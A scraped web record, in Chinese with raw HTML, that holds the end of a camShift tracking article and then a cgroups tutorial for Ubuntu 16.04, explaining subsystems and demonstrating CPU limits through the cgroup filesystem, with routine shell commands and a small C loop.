href=\"http://blog.csdn.net/carson2005/article/details/7337432\" target=\"_blank\">http://blog.csdn.net/carson2005/article/details/7337432</a>）是一种非参数概率密度估计方法，它通过不断迭代计算得到最优搜索窗口的位置和大小。</p>\n<p>C、camShift跟踪算法</p>\n<p>前面提到，camShift其实就是在视频序列的每一帧当中都运用meanShift，并将上一帧的meanShift结果作为下一帧的初始值，如此不断循环迭代，就可以实现目标的跟踪了。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114283\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114283votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114283\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/30fcdf79d0b901a9dde107f5e6e10f11fd95d574.jpg"}
{"title": "Linux cgroups 命令简介", "url": "http://blog.jobbole.com/114311/", "create_date": "2018/08/23", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "url_object_id": "55f5db66a79f044fb9cda220f73cbb30", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/sparkdev/p/8296063.html\">sparkdev</a>   </div><p>cgroups(Control Groups) 是 linux 内核提供的一种机制，<strong>这种机制可以根据需求把一系列系统任务及其子任务整合(或分隔)到按资源划分等级的不同组内，从而为系统资源管理提供一个统一的框架</strong>。简单说，cgroups 可以限制、记录任务组所使用的物理资源。本质上来说，cgroups 是内核附加在程序上的一系列钩子(hook)，通过程序运行时对资源的调度触发相应的钩子以达到资源追踪和限制的目的。</p>\n<p>本文以 Ubuntu 16.04 系统为例介绍 cgroups，所有的 demo 均在该系统中演示。</p>\n<h1>为什么要了解 cgroups</h1>\n<p>在以容器技术为代表的虚拟化技术大行其道的时代了解 cgroups 技术是非常必要的！比如我们可以很方便的限制某个容器可以使用的 CPU、内存等资源，这究竟是如何实现的呢？通过了解 cgroups 技术，我们可以窥探到 linux 系统中整个资源限制系统的脉络。从而帮助我们更好的理解和使用 linux 系统。</p>\n<h1>cgroups 的主要作用</h1>\n<p>实现 cgroups 的主要目的是为不同用户层面的资源管理提供一个统一化的接口。从单个任务的资源控制到操作系统层面的虚拟化，cgroups 提供了四大功能：</p>\n<ul>\n<li>资源限制：cgroups 可以对任务是要的资源总额进行限制。比如设定任务运行时使用的内存上限，一旦超出就发 OOM。</li>\n<li>优先级分配：通过分配的 CPU 时间片数量和磁盘 IO 带宽，实际上就等同于控制了任务运行的优先级。</li>\n<li>资源统计：cgoups 可以统计系统的资源使用量，比如 CPU 使用时长、内存用量等。这个功能非常适合当前云端产品按使用量计费的方式。</li>\n<li>任务控制：cgroups 可以对任务执行挂起、恢复等操作。</li>\n</ul>\n<h1>相关概念</h1>\n<p><strong>Task(任务)</strong> 在 linux 系统中，内核本身的调度和管理并不对进程和线程进行区分，只是根据 clone 时传入的参数的不同来从概念上区分进程和线程。这里使用 task 来表示系统的一个进程或线程。</p>\n<p><strong>Cgroup(控制组)</strong> cgroups 中的资源控制以 cgroup 为单位实现。Cgroup 表示按某种资源控制标准划分而成的任务组，包含一个或多个子系统。一个任务可以加入某个 cgroup，也可以从某个 cgroup 迁移到另一个 cgroup。</p>\n<p><strong>Subsystem(子系统)</strong> cgroups 中的子系统就是一个资源调度控制器(又叫 controllers)。比如 CPU 子系统可以控制 CPU 的时间分配，内存子系统可以限制内存的使用量。以笔者使用的 Ubuntu 16.04.3 为例，其内核版本为 4.10.0，支持的 subsystem 如下( cat /proc/cgroups)：<br>\n<strong>blkio</strong>         对块设备的 IO 进行限制。<br>\n<strong>cpu</strong>           限制 CPU 时间片的分配，与 cpuacct 挂载在同一目录。<br>\n<strong>cpuacct</strong>     生成 cgroup 中的任务占用 CPU 资源的报告，与 cpu 挂载在同一目录。<br>\n<strong>cpuset</strong>       给 cgroup 中的任务分配独立的 CPU(多处理器系统) 和内存节点。<br>\n<strong>devices</strong>     允许或禁止 cgroup 中的任务访问设备。<br>\n<strong>freezer</strong>      暂停/恢复 cgroup 中的任务。<br>\n<strong>hugetlb</strong>     限制使用的内存页数量。<br>\n<strong>memory</strong>    对 cgroup 中的任务的可用内存进行限制，并自动生成资源占用报告。<br>\n<strong>net_cls</strong>      使用等级识别符（classid）标记网络数据包，这让 Linux 流量控制器（tc 指令）可以识别来自特定 cgroup 任务的数据包，并进行网络限制。<br>\n<strong>net_prio</strong>    允许基于 cgroup 设置网络流量(netowork traffic)的优先级。<br>\n<strong>perf_event</strong>  允许使用 perf 工具来监控 cgroup。<br>\n<strong>pids</strong>          限制任务的数量。</p>\n<p><strong>Hierarchy(层级)</strong> 层级有一系列 cgroup 以一个树状结构排列而成，每个层级通过绑定对应的子系统进行资源控制。层级中的 cgroup 节点可以包含零个或多个子节点，子节点继承父节点挂载的子系统。一个操作系统中可以有多个层级。</p>\n<h1>cgroups 的文件系统接口</h1>\n<p>cgroups 以文件的方式提供应用接口，我们可以通过 mount 命令来查看 cgroups 默认的挂载点：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01ede877353581\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mount | grep cgroup</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ede877353581-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01ede877353581-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grep </span><span class=\"crayon-v\">cgroup</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n\n</div>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/7eae273e78a0168d876e3cb624f98207.png\" alt=\"\"></p>\n<p>第一行的 tmpfs 说明 /sys/fs/cgroup 目录下的文件都是存在于内存中的临时文件。<br>\n第二行的挂载点 /sys/fs/cgroup/systemd 用于 systemd 系统对 cgroups 的支持，相关内容笔者今后会做专门的介绍。<br>\n其余的挂载点则是内核支持的各个子系统的根级层级结构。</p>\n<p>需要注意的是，在使用 systemd 系统的操作系统中，/sys/fs/cgroup 目录都是由 systemd 在系统启动的过程中挂载的，并且挂载为只读的类型。换句话说，系统是不建议我们在 /sys/fs/cgroup 目录下创建新的目录并挂载其它子系统的。这一点与之前的操作系统不太一样。</p>\n<p>下面让我们来探索一下 /sys/fs/cgroup 目录及其子目录下都是些什么：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/90e54d4b7a21003f895d964df349a483.png\" alt=\"\"></p>\n<p>/sys/fs/cgroup 目录下是各个子系统的根目录。我们以 memory 子系统为例，看看 memory 目录下都有什么？</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/666e1211947312a1b098948d7243612d.png\" alt=\"\"></p>\n<p>这些文件就是 cgroups 的 memory 子系统中的根级设置。比如 memory.limit_in_bytes 中的数字用来限制进程的最大可用内存，memory.swappiness 中保存着使用 swap 的权重等等。</p>\n<p>既然 cgroups 是以这些文件作为 API 的，那么我就可以通过创建或者是修改这些文件的内容来应用 cgroups。具体该怎么做呢？比如我们怎么才能限制某个进程可以使用的资源呢？接下来我们就通过简单的 demo 来演示如何使用 cgroups 限制进程可以使用的资源。</p>\n<h1>查看进程所属的 cgroups</h1>\n<p>可以通过 /proc/[pid]/cgroup 来查看指定进程属于哪些 cgroup：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/c8edeee1b37fbf6be02cea87dec61c2d.png\" alt=\"\"></p>\n<p>每一行包含用冒号隔开的三列，他们的含义分别是：</p>\n<ul>\n<li>cgroup 树的 ID， 和 /proc/cgroups 文件中的 ID 一一对应。</li>\n<li>和 cgroup 树绑定的所有 subsystem，多个 subsystem 之间用逗号隔开。这里 name=systemd 表示没有和任何 subsystem 绑定，只是给他起了个名字叫 systemd。</li>\n<li>进程在 cgroup 树中的路径，即进程所属的 cgroup，这个路径是相对于挂载点的相对路径。</li>\n</ul>\n<p>既然 cgroups 是以这些文件作为 API 的，那么我就可以通过创建或者是修改这些文件的内容来应用 cgroups。具体该怎么做呢？比如我们怎么才能限制某个进程可以使用的资源呢？接下来我们就通过简单的 demo 来演示如何使用 cgroups 限制进程可以使用的资源。</p>\n<h1>cgroups 工具</h1>\n<p>在介绍通过 systemd 应用 cgroups 之前，我们先使用 cgroup-bin 工具包中的 cgexec 来演示 demo。Ubuntu 默认没有安装 cgroup-bin 工具包，请通过下面的命令安装：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01eea348050710\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo apt install cgroup-bin</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01eea348050710-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01eea348050710-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">apt </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">cgroup</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">bin</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n\n</div>\n<h1>demo：限制进程可用的 CPU</h1>\n<p>在我们使用 cgroups 时，最好不要直接在各个子系统的根目录下直接修改其配置文件。推荐的方式是为不同的需求在子系统树中定义不同的节点。比如我们可以在 /sys/fs/cgroup/cpu 目录下新建一个名称为 nick_cpu 的目录：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01eee472877067\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cd  /sys/fs/cgroup/cpu\r\n$ sudo mkdir nick_cpu</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01eee472877067-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01eee472877067-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01eee472877067-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cd</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">fs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cgroup</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">cpu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01eee472877067-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">mkdir </span><span class=\"crayon-v\">nick_cpu</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<p>然后查看新建的目录下的内容：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/207278d450eae17c76362546276f51ef.png\" alt=\"\"></p>\n<p>是不是有点吃惊，cgroups 的文件系统会在创建文件目录的时候自动创建这些配置文件！</p>\n<p>让我们通过下面的设置把 CPU 周期限制为总量的十分之一：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01ef2090865622\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo su\r\n$ echo 100000 &gt; nick_cpu/cpu.cfs_period_us\r\n$ echo 10000 &gt; nick_cpu/cpu.cfs_quota_us</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ef2090865622-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01ef2090865622-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ef2090865622-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01ef2090865622-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-i\">su</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01ef2090865622-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nick_cpu</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cpu</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cfs_period</span><span class=\"crayon-sy\">_</span>us</div><div class=\"crayon-line\" id=\"crayon-5bab670d01ef2090865622-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nick_cpu</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cpu</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cfs_quota_us</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n\n</div>\n<p>上面的两个参数眼熟吗？没错，笔者在《<a href=\"http://www.cnblogs.com/sparkdev/p/8052522.html\" target=\"_blank\">Docker: 限制容器可用的 CPU</a>》一文中介绍的 “–cpu-period=100000 –cpu-quota=200000” 就是由它们实现的。</p>\n<p>然后创建一个 CPU 密集型的程序：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01ef5882990645\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvoid main()\r\n{\r\n    unsigned int i, end;\r\n\r\n    end = 1024 * 1024 * 1024;\r\n    for(i = 0; i &lt; end; )\r\n    {\r\n        i ++;\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ef5882990645-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01ef5882990645-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ef5882990645-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01ef5882990645-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ef5882990645-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01ef5882990645-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ef5882990645-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01ef5882990645-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ef5882990645-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01ef5882990645-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01ef5882990645-1\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01ef5882990645-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01ef5882990645-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">end</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01ef5882990645-4\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670d01ef5882990645-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">end</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01ef5882990645-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">end</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01ef5882990645-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01ef5882990645-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span 